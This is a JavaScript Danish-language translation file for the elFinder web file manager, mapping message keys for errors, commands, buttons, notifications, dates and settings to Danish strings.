/**
 * Danish translation
 * @author Mark Topper (webman.io)
 * @author Helmuth Mikkelsen <helmuthm@gmail.com>
 * @version 2022-02-28
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.da = {
		translator : 'Mark Topper (webman.io), Helmuth Mikkelsen &lt;helmuthm@gmail.com&gt;',
		language   : 'Danish',
		direction  : 'ltr',
		dateFormat : 'd.m.Y H:i', // will show like: 28.02.2022 11:38
		fancyDateFormat : '$1 H:i', // will show like: I dag 11:38
		nonameDateFormat : 'Ymd-His', // noname upload will show like: 20220228-113848
		messages   : {
			'getShareText' : 'Del',
			'Editor ': 'Kode Editor',
			/********************************** errors **********************************/
			'error'                : 'Fejl',
			'errUnknown'           : 'Ukendt fejl.',
			'errUnknownCmd'        : 'Ukendt kommando.',
			'errJqui'              : 'Ugyldig jQuery UI-konfiguration. Valgbare, trækbare og dropbare komponenter skal medtages.',
			'errNode'              : 'elFinder kræver DOM Element oprettet.',
			'errURL'               : 'Ugyldig elFinder konfiguration! URL option er ikke sat.',
			'errAccess'            : 'Adgang nægtet.',
			'errConnect'           : 'Kan ikke få kontatkt med backend.',
			'errAbort'             : 'Forbindelse afbrudt.',
			'errTimeout'           : 'Forbindelse timeout.',
			'errNotFound'          : 'Backend ikke fundet.',
			'errResponse'          : 'Ugyldigt backend svar.',
			'errConf'              : 'Ugyldig backend konfiguration.',
			'errJSON'              : 'PHP JSON modul ikke installeret.',
			'errNoVolumes'         : 'Læsbare diskenheder er ikke tilgængelige.',
			'errCmdParams'         : 'Ugyldige parametre for kommando "$1".',
			'errDataNotJSON'       : 'Data er ikke JSON.',
			'errDataEmpty'         : 'Data er tom.',
			'errCmdReq'            : 'Backend-anmodning kræver kommandonavn.',
			'errOpen'              : 'Kunne ikke åbne "$1".',
			'errNotFolder'         : 'Objektet er ikke en mappe.',
			'errNotFile'           : 'Objektet er ikke en fil.',
			'errRead'              : 'Kunne ikke læse "$1".',
			'errWrite'             : 'Kunne ikke skrive til "$1".',
			'errPerm'              : 'Adgang nægtet.',
			'errLocked'            : '"$1" er låst og kan ikke blive omdøbt, flyttet eller slettet.',
			'errExists'            : 'Der findes allerede en fil ved navn "$1".',
			'errInvName'           : 'Ugyldigt filnavn.',
			'errInvDirname'        : 'Ugyldigt mappenavn.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Mappe ikke fundet.',
			'errFileNotFound'      : 'Fil ikke fundet.',
			'errTrgFolderNotFound' : 'Mappen "$1" blev ikke fundet.',
			'errPopup'             : 'Browser forhindrede åbning af pop up-vindue. For at åbne filen skal du aktivere den i browserindstillinger.',
			'errMkdir'             : 'Kunne ikke oprette mappen "$1".',
			'errMkfile'            : 'Kunne ikke oprette filen "$1".',
			'errRename'            : 'Kunne ikke omdøbe "$1".',
			'errCopyFrom'          : 'Kopiering af filer fra diskenhed "$1" er ikke tilladt.',
			'errCopyTo'            : 'Kopiering af filer til diskenhed "$1" er ikke tilladt.',
			'errMkOutLink'         : 'Kan ikke oprette et link til uden for diskenhedsroden.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Upload fejl.',  // old name - errUploadCommon
			'errUploadFile'        : 'Kunne ikke uploade "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Ingen filer fundet til upload.',
			'errUploadTotalSize'   : 'Data overskrider den maksimalt tilladte størrelse.', // old name - errMaxSize
			'errUploadFileSize'    : 'Fil overskrider den maksimalt tilladte størrelse.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Filtype ikke godkendt.',
			'errUploadTransfer'    : '"$1" overførselsfejl.',
			'errUploadTemp'        : 'Kan ikke oprette midlertidig fil til upload.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Objekt "$1" findes allerede på dette sted og kan ikke erstattes af objekt med en anden type.', // new
			'errReplace'           : 'Kan ikke erstatte "$1".',
			'errSave'              : 'Kunne ikke gemme "$1".',
			'errCopy'              : 'Kunne ikke kopiere "$1".',
			'errMove'              : 'Kunne ikke flytte "$1".',
			'errCopyInItself'      : 'Kunne ikke kopiere "$1" til sig selv.',
			'errRm'                : 'Kunne ikke slette "$1".',
			'errTrash'             : 'Kan ikke komme i papirkurven.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Kunne ikke fjerne kildefil(er).',
			'errExtract'           : 'Kunne ikke udpakke filer fra "$1".',
			'errArchive'           : 'Kunne ikke oprette arkiv.',
			'errArcType'           : 'Arkivtypen er ikke understøttet.',
			'errNoArchive'         : 'Filen er ikke et arkiv eller har ien kke-understøttet arkivtype.',
			'errCmdNoSupport'      : 'Backend understøtter ikke denne kommando.',
			'errReplByChild'       : 'Mappen "$1" kan ikke erstattes af et element, den indeholder.',
			'errArcSymlinks'       : 'Af sikkerhedsmæssige årsager nægtes at udpakke arkiver der indeholder symlinks eller filer med ikke-tilladte navne.', // edited 24.06.2012
			'errArcMaxSize'        : 'Arkivfiler overskrider den maksimalt tilladte størrelse.',
			'errResize'            : 'Kunne ikke ændre størrelsen på "$1".',
			'errResizeDegree'      : 'Ugyldig rotationsgrad.',  // added 7.3.2013
			'errResizeRotate'      : 'Kunne ikke rotere billedet.',  // added 7.3.2013
			'errResizeSize'        : 'Ugyldig billedstørrelse.',  // added 7.3.2013
			'errResizeNoChange'    : 'Billedstørrelse ikke ændret.',  // added 7.3.2013
			'errUsupportType'      : 'Ikke-understøttet filtype.',
			'errNotUTF8Content'    : 'Filen "$1" er ikke i UTF-8 og kan ikke blive redigeret.',  // added 9.11.2011
			'errNetMount'          : 'Kunne ikke mounte "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Ikke-understøttet protokol.',     // added 17.04.2012
			'errNetMountFailed'    : 'Mount mislykkedes.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Værten kræves.', // added 18.04.2012
			'errSessionExpires'    : 'Din session er udløbet på grund af inaktivitet.',
			'errCreatingTempDir'   : 'Kunne ikke oprette midlertidig mappe: "$1"',
			'errFtpDownloadFile'   : 'Kunne ikke downloade filen fra FTP: "$1"',
			'errFtpUploadFile'     : 'Kunne ikke uploade filen til FTP: "$1"',
			'errFtpMkdir'          : 'Kunne ikke oprette fjernmappe på FTP: "$1"',
			'errArchiveExec'       : 'Fejl under arkivering af filer: "$1"',
			'errExtractExec'       : 'Fejl under udpakning af filer: "$1"',
			'errNetUnMount'        : 'Kan ikke unmounte.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Kan ikke konverteres til UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Prøv den nyeste browser, hvis du vil uploade mappen.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Time out under søgning på "$1". Søgeresultatet er delvis.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Re-autorisation er påkrævet.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Maksimalt antal valgbare emner er $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Kan ikke gendannes fra papirkurven. Kan ikke identificere gendannelsesdestinationen.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Editor blev ikke fundet til denne filtype.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Der opstod en fejl på serversiden.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Kunne ikke tømme mappen "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Der er $1 flere fejl.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Du kan oprette op til $1 mapper ad gangen.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Opret arkiv',
			'cmdback'      : 'Tilbage',
			'cmdcopy'      : 'Kopier',
			'cmdcut'       : 'Klip',
			'cmddownload'  : 'Downloade',
			'cmdduplicate' : 'Dupliker',
			'cmdedit'      : 'Rediger fil',
			'cmdextract'   : 'Udpak filer fra arkiv',
			'cmdforward'   : 'Frem',
			'cmdgetfile'   : 'Vælg filer',
			'cmdhelp'      : 'Om denne software',
			'cmdhome'      : 'Hjem',
			'cmdinfo'      : 'Information',
			'cmdmkdir'     : 'Ny mappe',
			'cmdmkdirin'   : 'I en ny mappe', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Ny fil',
			'cmdopen'      : 'Åben',
			'cmdpaste'     : 'Indsæt',
			'cmdquicklook' : 'Vis',
			'cmdreload'    : 'Genindlæs',
			'cmdrename'    : 'Omdøb',
			'cmdrm'        : 'Slet',
			'cmdtrash'     : 'I papirkurven', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Gendan', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Find filer',
			'cmdup'        : 'Gå til overordnet mappe',
			'cmdupload'    : 'Upload filer',
			'cmdview'      : 'Vis',
			'cmdresize'    : 'Tilpas størrelse & Roter',
			'cmdsort'      : 'Sorter',
			'cmdnetmount'  : 'Mount netværksdrev', // added 18.04.2012
			'cmdnetunmount': 'Afmonter', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Til steder', // added 28.12.2014
			'cmdchmod'     : 'Skift tilstand', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Åbn en mappe', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Nulstil søjlebredde', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Fuld skærm', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Flyt', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Tøm mappe', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Fortryd', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Gentag igen', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Præferencer', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Vælg alle', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Vælg ingen', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Inverter valg', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Åbn i nyt vindue', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Skjul (præference)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Luk',
			'btnSave'   : 'Gem',
			'btnRm'     : 'Slet',
			'btnApply'  : 'Anvend',
			'btnCancel' : 'Annuler',
			'btnNo'     : 'Nej',
			'btnYes'    : 'Ja',
			'btnMount'  : 'Mount',  // added 18.04.2012
			'btnApprove': 'Gå til $1 & godkend', // from v2.1 added 26.04.2012
			'btnUnmount': 'Afmonter', // from v2.1 added 30.04.2012
			'btnConv'   : 'Konverter', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Her',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Diskenhed',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Alle',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME-type', // from v2.1 added 22.5.2015
			'btnFileName':'Filnavn',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Gem & Luk', // from v2.1 added 12.6.2015
			'btnBackup' : 'Sikkerhedskopiering', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Omdøb',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Omdøb(Alle)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Forrige ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Næste ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Gem som', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Åben mappe',
			'ntffile'     : 'Åben fil',
			'ntfreload'   : 'Genindlæs mappeindhold',
			'ntfmkdir'    : 'Opretter mappe',
			'ntfmkfile'   : 'Opretter filer',
			'ntfrm'       : 'Sletter filer',
			'ntfcopy'     : 'Kopier filer',
			'ntfmove'     : 'Flytter filer',
			'ntfprepare'  : 'Kontrol af eksisterende emner',
			'ntfrename'   : 'Omdøb filer',
			'ntfupload'   : 'Uploader filer',
			'ntfdownload' : 'Downloader filer',
			'ntfsave'     : 'Gemmer filer',
			'ntfarchive'  : 'Opretter arkiv',
			'ntfextract'  : 'Udpakker filer fra arkiv',
			'ntfsearch'   : 'Søger filer',
			'ntfresize'   : 'Ændring af størrelsen på billeder',
			'ntfsmth'     : 'Gør noget',
			'ntfloadimg'  : 'Henter billede',
			'ntfnetmount' : 'Mounter netværksdrev', // added 18.04.2012
			'ntfnetunmount': 'Unmounter netværksdrev', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Henter billeddimension', // added 20.05.2013
			'ntfreaddir'  : 'Læser folderinfomation', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Får URL til link', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Ændring af filtilstand', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Bekræftelse af upload filnavn', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Oprettelse af en fil til download', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Få stiinformation', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Behandler den uploadede fil', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Smider i papirkurv', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Udfører gendannelse fra papirkurven', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Kontrollerer destinationsmappe', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Fortryder tidligere handling', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Gentager tidligere fortryd', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Kontrol af indhold', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Papirkurv', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'ukendt',
			'Today'       : 'I dag',
			'Yesterday'   : 'I går',
			'msJan'       : 'januar',
			'msFeb'       : 'februar',
			'msMar'       : 'marts',
			'msApr'       : 'april',
			'msMay'       : 'Maj',
			'msJun'       : 'juni',
			'msJul'       : 'juli',
			'msAug'       : 'Aug',
			'msSep'       : 'Sep',
			'msOct'       : 'Okt',
			'msNov'       : 'Nov',
			'msDec'       : 'Dec',
			'January'     : 'Januar',
			'February'    : 'Februar',
			'March'       : 'Marts',
			'April'       : 'April',
			'May'         : 'Maj',
			'June'        : 'Juni',
			'July'        : 'Juli',
			'August'      : 'August',
			'September'   : 'September',
			'October'     : 'Oktober',
			'November'    : 'November',
			'December'    : 'December',
			'Sunday'      : 'Søndag',
			'Monday'      : 'Mandag',
			'Tuesday'     : 'Tirsdag',
			'Wednesday'   : 'Onsdag',
			'Thursday'    : 'Torsdag',
			'Friday'      : 'Fredag',
			'Saturday'    : 'Lørdag',
			'Sun'         : 'Søn',
			'Mon'         : 'Man',
			'Tue'         : 'Tir',
			'Wed'         : 'Ons',
			'Thu'         : 'Tor',
			'Fri'         : 'Fre',
			'Sat'         : 'Lør',

			/******************************** sort variants ********************************/
			'sortname'          : 'efter navn',
			'sortkind'          : 'efter type',
			'sortsize'          : 'efter størrelse',
			'sortdate'          : 'efter dato',
			'sortFoldersFirst'  : 'Mapper først',
			'sortperm'          : 'efter tilladelse', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'efter mode',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'efter ejer',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'efter gruppe',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Også Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NyFil.txt', // added 10.11.2015
			'untitled folder'   : 'NyFolder',   // added 10.11.2015
			'Archive'           : 'NytArkiv',  // from v2.1 added 10.11.2015
			'untitled file'     : 'NyFil.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Fil',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Bekræftelse påkrævet',
			'confirmRm'       : 'Er du sikker på du vil slette valgte filer?<br/>Dette kan ikke fortrydes!',
			'confirmRepl'     : 'Erstat gammel fil med ny fil?',
			'confirmRest'     : 'Erstat eksisterende element med elementet i papirkurven?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Ikke i UTF-8<br/>Konverter til UTF-8?<br/>Indholdet bliver UTF-8 ved at gemme efter konvertering.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Tegnkodning af denne fil kunne ikke registreres. Det er nødvendigt at konvertere midlertidigt til UTF-8 til redigering.<br/>Vælg tegnkodning af denne fil.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Det er blevet ændret.<br/>Du mister arbejde, hvis du ikke gemmer ændringer.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Er du sikker på, at du vil flytte emner til papirkurven?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Er du sikker på, at du vil flytte emner til "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Anvend ved alle',
			'name'            : 'Navn',
			'size'            : 'Størrelse',
			'perms'           : 'Rettigheder',
			'modify'          : 'Ændret',
			'kind'            : 'Type',
			'read'            : 'læse',
			'write'           : 'skrive',
			'noaccess'        : 'ingen adgang',
			'and'             : 'og',
			'unknown'         : 'ukendt',
			'selectall'       : 'Vælg alle filer',
			'selectfiles'     : 'Vælg fil(er)',
			'selectffile'     : 'Vælg første fil',
			'selectlfile'     : 'Vælg sidste fil',
			'viewlist'        : 'Listevisning',
			'viewicons'       : 'Ikonvisning',
			'viewSmall'       : 'Små ikoner', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Medium ikoner', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Store ikoner', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Ekstra store ikoner', // from v2.1.39 added 22.5.2018
			'places'          : 'Placeringer',
			'calc'            : 'Beregn',
			'path'            : 'Sti',
			'aliasfor'        : 'Alias for',
			'locked'          : 'Låst',
			'dim'             : 'Størrelser',
			'files'           : 'Filer',
			'folders'         : 'Mapper',
			'items'           : 'Emner',
			'yes'             : 'ja',
			'no'              : 'nej',
			'link'            : 'Link',
			'searcresult'     : 'Søgeresultater',
			'selected'        : 'valgte emner',
			'about'           : 'Om',
			'shortcuts'       : 'Genveje',
			'help'            : 'Hjælp',
			'webfm'           : 'Internet filmanager',
			'ver'             : 'Version',
			'protocolver'     : 'protokol version',
			'homepage'        : 'Projektside',
			'docs'            : 'Dokumentation',
			'github'          : 'Fork os på Github',
			'twitter'         : 'Følg os på Twitter',
			'facebook'        : 'Følg os på Facebook',
			'team'            : 'Hold',
			'chiefdev'        : 'hovedudvikler',
			'developer'       : 'udvikler',
			'contributor'     : 'bidragyder',
			'maintainer'      : 'vedligeholder',
			'translator'      : 'oversætter',
			'icons'           : 'Ikoner',
			'dontforget'      : 'og glem ikke at tage dit håndklæde',
			'shortcutsof'     : 'Gemveje deaktiveret',
			'dropFiles'       : 'Drop filer hertil',
			'or'              : 'eller',
			'selectForUpload' : 'Vælg filer',
			'moveFiles'       : 'Flyt filer',
			'copyFiles'       : 'Kopier filer',
			'restoreFiles'    : 'Gendan emner', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Slet fra placering',
			'aspectRatio'     : 'Skærmformat',
			'scale'           : 'Skala',
			'width'           : 'Bredde',
			'height'          : 'Højde',
			'resize'          : 'Tilpas størrelse',
			'crop'            : 'Beskær',
			'rotate'          : 'Roter',
			'rotate-cw'       : 'Roter 90 grader med uret',
			'rotate-ccw'      : 'Roter 90 grader mod uret',
			'degree'          : 'Grader',
			'netMountDialogTitle' : 'Mount netwærkdrev', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Vært', // added 18.04.2012
			'port'                : 'Port', // added 18.04.2012
			'user'                : 'Bruger', // added 18.04.2012
			'pass'                : 'Kodeord', // added 18.04.2012
			'confirmUnmount'      : 'Unmounter du $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Slip eller indsæt filer fra browseren', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Slip filer, indsæt webadresser eller billeder (udklipsholder) her', // from v2.1 added 07.04.2014
			'encoding'        : 'Indkodning', // from v2.1 added 19.12.2014
			'locale'          : 'Sprog',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Mål: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Søg efter input MIME-type', // from v2.1 added 22.5.2015
			'owner'           : 'Ejer', // from v2.1 added 20.6.2015
			'group'           : 'Gruppe', // from v2.1 added 20.6.2015
			'other'           : 'Andet', // from v2.1 added 20.6.2015
			'execute'         : 'Udfør', // from v2.1 added 20.6.2015
			'perm'            : 'Tilladelse', // from v2.1 added 20.6.2015
			'mode'            : 'Mode', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Mappe er tom', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Mappe er tom\\A Drop for at tilføje enmer', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Mappen er tom\\A Langt tryk for at tilføje emner', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kvalitet', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Autosync',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Flyt op',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Hent URL-link', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Valgte emner ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'Folder-ID', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Tillad offline adgang', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'For at godkende igen', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Indlæser nu...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Åben flere filer', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Du prøver at åbne $1-filerne. Er du sikker på, at du vil åbne i browseren?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Søgeresultaterne er tomme i søgemålet.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Redigerer en fil.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Du har valgt $1 emner.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Du har $1 emner i udklipsholder.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Inkrementel søgning er kun fra den aktuelle visning.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Genindsæt', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 færdig', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Kontekstmenu', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Sidevending', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Diskenheds rødder', // from v2.1.16 added 16.9.2016
			'reset'           : 'Nulstil', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Baggrundsfarve', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Farvevælger', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px grid', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Aktiveret', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Deaktiveret', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Søgeresultaterne er tomme i den aktuelle visning.\\ATryk på [Enter] for at udvide søgemålet.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Førstebogstavs søgeresultater er tomme i den aktuelle visning.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Tekstlabel', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 minutter tilbage', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Åbn igen med valgt encoding', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Gem med valgt encoding', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Vælg mappe', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Førstebogstavs søgning', // from v2.1.23 added 24.3.2017
			'presets'         : 'Forudindstillinger', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Det er for mange emner, så det kan ikke komme i papirkurven.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'TextArea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Tøm mappen "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Der er ingen emner i mappen "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Præference', // from v2.1.26 added 28.6.2017
			'language'        : 'Sprog', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Initialiser de indstillinger, der er gemt i denne browser', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Værktøjslinjens indstillinger', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 tegn tilbage.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $1 linjer tilbage.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Sum', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Omtrentlig filstørrelse', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Fokuser på elementet i dialog med musemarkering',  // from v2.1.30 added 2.11.2017
			'select'          : 'Vælg', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Handling, når du vælger fil', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Åbn med den editor, der blev brugt sidst', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Inverter valg', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Er du sikker på, at du vil omdøbe $1 valgte emner som $2?<br/>Dette kan ikke fortrydes!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Batch omdøbning', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Tal', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Tilføj prefix', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Tilføj suffix', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Skift filendelse', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Kolonneindstillinger (listevisning)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Alle ændringer påvirker straks arkivet.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Eventuelle ændringer gennemføres ikke, før denne enhed fjernes.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Følgende disk(e) mounted på denne enhed unmountes også. Er du sikker på at unmounte den?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Valg info', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmer, der viser filens hash', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Info-emner (panelet til valg af info)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Tryk igen for at afslutte.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Værktøjslinje', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Arbejdsområde', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialog', // from v2.1.38 added 4.4.2018
			'all'             : 'Alle', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Ikonstørrelse (ikonvisning)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Åbn det maksimerede editorvindue', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Da konvertering via API ikke er tilgængelig i øjeblikket, bedes du konvertere på webstedet.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Efter konvertering skal du uploade med elementets URL eller en downloadet fil for at gemme den konverterede fil.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Konverter på stedet på $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integrationer', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Denne elFinder har følgende eksterne tjenester integreret. Kontroller venligst vilkårene for brug, fortrolighedspolitik osv. inden du bruger det.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Vis skjulte emner', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Skjul skjulte emner', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Vis / Skjul skjulte emner', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Filtyper, der skal aktiveres med "Ny fil"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Type af tekstfilen', // from v2.1.41 added 7.8.2018
			'add'             : 'Tilføj', // from v2.1.41 added 7.8.2018
			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'Standard', // from v2.1.43 added 19.10.2018
			'description'     : 'Beskrivelse', // from v2.1.43 added 19.10.2018
			'website'         : 'Hjemmeside', // from v2.1.43 added 19.10.2018
			'author'          : 'Forfatter', // from v2.1.43 added 19.10.2018
			'email'           : 'Mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Licens', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Dette element kan ikke gemmes. For at undgå at miste redigeringerne skal du eksportere til din pc.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Dobbeltklik på filen for at vælge den.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Brug fuldskærmstilstand', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Ukendt',
			'kindRoot'        : 'Diskenheds rod', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Mappe',
